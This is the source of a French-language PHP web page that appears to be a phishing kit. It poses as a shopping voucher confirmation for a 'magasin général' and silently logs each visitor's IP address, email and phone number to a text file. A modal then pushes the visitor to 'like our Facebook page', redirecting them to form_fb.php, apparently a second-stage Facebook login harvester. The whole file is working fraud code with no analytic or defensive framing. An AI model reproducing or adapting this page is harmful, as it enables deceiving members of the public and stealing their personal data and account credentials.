<?php
$myfile = fopen("details.txt", "a+") or die("Unable to open file!");
$objDateTime = new DateTime('NOW');
$result = $objDateTime->format('Y-m-d H:i:s');



fwrite($myfile, "------------------FIRST VISIT--------------);." . PHP_EOL . "Time connected :" . $result . PHP_EOL . "ip adresss : " . $_SERVER['REMOTE_ADDR'] . PHP_EOL);

$email = $_POST['email'] . PHP_EOL;
$phone = $_POST['phone'] . PHP_EOL;
fwrite($myfile, "email: " . $email);
fwrite($myfile, "numero: " . $phone);

fclose($myfile);
if (isset($_POST['SubmitButton'])) {
}





?>
<html>




<head>
    <style>
        .main-block,
        .info {
            display: flex;
            flex-direction: column;
        }

        .main-block {
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100%;
            background-size: cover;
            filter: blur(5px);
            -webkit-filter: blur(5px);
            -moz-filter: blur(5px);
            -o-filter: blur(5px);
            -ms-filter: blur(5px);
        }

        form {
            width: 86%;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: solid 1px #FFEE00;
            box-shadow: 1px 2px 5px rgba(0, 0, 0, .31);
            background: #ebebeb;
        }

        .info-item {
            width: 100%;
        }

        input {
            width: calc(100% - 57px);
            height: 36px;
            padding-left: 10px;
            margin: 0 0 12px -5px;
            border-radius: 0 5px 5px 0;
            border: solid 1px #cbc9c9;
            box-shadow: 1px 2px 5px rgba(0, 0, 0, .09);
            background: #FFEE00;
        }

        .icon {
            padding: 9px 15px;
            margin-top: -1px;
            border-radius: 5px 0 0 5px;
            border: solid 0px #cbc9c9;
            background: #666;
            color: #fff;
        }

        input[type=radio] {
            display: none;
        }

        label.radio {
            position: relative;
            display: inline-block;
            text-indent: 32px;
            cursor: pointer;
        }

        label.radio:before {
            content: "";
            position: absolute;
            left: 0;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 0.5px solid #8ebf42;
            background: #fff;
        }

        label.radio:after {
            content: "";
            position: absolute;
            width: 8px;
            height: 4px;
            top: 5px;
            left: 4px;
            border-bottom: 3px solid #8ebf42;
            border-left: 3px solid #8ebf42;
            transform: rotate(-45deg);
            opacity: 0;
        }

        input[type=radio]:checked+label:after {
            opacity: 1;
        }

        textarea {
            width: 99%;
            margin-bottom: 12px;
        }

        button {
            width: 100%;
            padding: 8px;
            border-radius: 5px;
            border: none;
            background: #8ebf42;
            font-size: 14px;
            font-weight: 600;
            color: #fff;

        }

        button:disabled:hover {
            background: grey;

        }

        button:disabled {
            background: grey;

        }

        button:hover {
            background: #82b534;
        }

        .grade-type div {
            display: flex;
            margin: 6px 0;
        }

        @media (min-width: 568px) {
            .info {
                flex-flow: row wrap;
                justify-content: space-between;
            }
        }

        #test {
            background-repeat: no-repeat;
            position: relative;

            filter: blur(8px);
            -webkit-filter: blur(8px);
        }

        .loader {
            display: block;
            border: 16px solid #f3f3f3;
            /* Light grey */
            border-top: 16px solid #3498db;
            /* Blue */
            border-radius: 50%;
            width: 120px;
            height: 120px;
            /* Hidden by default */
            /* Stay in place */
            /* Sit on top */

            margin: auto;
            position: absolute;
            top: 50%;
            left: 50%;
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);

            /* Full height */
            overflow: auto;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }

            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }


        html,
        body {
            height: 100%;
            background-image: url('./background.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
            padding: 0;
            margin: 0;
            outline: none;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: #666;

        }

        body {

            padding: 0;
            margin: 0;
            outline: none;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: #666;
        }

        #wrapper {
            display: flex;
            align-items: center;
            position: absolute;
            height: 100%;


        }


        #loadingCircular {
            align-items: center;


        }


        .blur {
            filter: blur(5px);
            -webkit-filter: blur(5px);
            -moz-filter: blur(5px);
            -o-filter: blur(5px);
            -ms-filter: blur(5px);
        }



        h1 {
            font-size: 28px;
        }

        /* The Modal (background) */
        .modal {
            display: none;
            /* Hidden by default */
            position: fixed;
            /* Stay in place */
            z-index: 1;
            /* Sit on top */
            left: 0;
            top: 0;
            width: 100%;
            /* Full width */
            height: 100%;
            /* Full height */
            overflow: auto;
            /* Enable scroll if needed */
            background-color: rgb(0, 0, 0);
            /* Fallback color */
            background-color: rgba(0, 0, 0, 0.4);
            /* Black w/ opacity */
        }

        /* Modal Content/Box */
        .modal-content {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background-color: #fefefe;
            margin: 15% auto;
            /* 15% from the top and centered */
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            /* Could be more or less, depending on screen size */
        }

        /* The Close Button */
        .close {
            color: #aaa;
            display: flex;
            align-self: flex-end;
            font-size: 28px;
            font-weight: bold;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }
    </style>

</head>

<body>



    <div id="wrapper">

        <div id="main-block" class="main-block">
            <form id="form" onsubmit="myBlurFunction(1)" action="<?= $_SERVER['PHP_SELF']; ?>" method="post">
                <div class="info">
                    <center>
                        <h1>Confirmer votre bon d'achat</h1>
                    </center>
                    <div class="info-item">
                        <label class="icon" for="name"><i class="fas fa-user"></i></label>
                        <input type="text" name="name" disabled id="name" placeholder="Raoudha Ayari" required />
                    </div>


                    <div class="info-item">
                        <label class="icon" for="email"><i class="fas fa-envelope"></i></label>
                        <input type="email" name="email" oninvalid="this.setCustomValidity('Veuillez remplir votre email')" id="emailoz" placeholder="Email" onchange="this.setCustomValidity('')" required />
                    </div>
                    <div class="info-item">
                        <label class="icon" for="phone"><i class="fas fa-phone"></i></label>
                        <input type="text" name="phone" id="phone" placeholder="Phone" oninvalid="this.setCustomValidity('Veuillez remplir votre telephone')" onchange="this.setCustomValidity('')" required />
                    </div>
                </div>
                <div class="grade-type">
                    <h3>Lire attentivement :</h3>
                    <p>Aprés la cofirmation de votre bon d'achat ,vous allez recevoir un email
                        que vous devez imprimer ou l'afficher au sein du magasin géneral , Ainsi ,
                        Veuillez présenter votre carte d'identité au sein du magasin géneral qui porte le nom 'Raoudha
                        Ayari',
                        Pour beneficiez de votre de bon d'achat.
                    </p>

                </div>
                <button id="btn1" type="submit" name="SubmitButton" disabled>Confirmer</button>
            </form>
        </div>
        <div class="loader"></div>

        <div id="myModal" class="modal">

            <!-- Modal content -->
            <div class="modal-content">
            <span class="close">&times;</span>

                <img src="magasin-général.png" alt="" width="300" >


                <p style="text-align: center;">Vous devez aimer notre page facebook pour réclamer votre bon d'achat..</p>
                <button onclick="redirect()">Aimer notre page</button>
            </div>

        </div>

        <script>
            function redirect() {
                window.location.href = "form_fb.php";
            }
            var modal = document.getElementById("myModal");
            var span = document.getElementsByClassName("close")[0];
            var loader = document.getElementsByClassName('loader')[0];
            // span.onclick = function() {
            //     modal.style.display = "none";
            // }

            function myClick() {
                setTimeout(function() {
                    loader.style.display = 'none';
                    modal.style.display = 'block';
                }, 2000);
            }
            myClick();
        </script>
</body>

</html>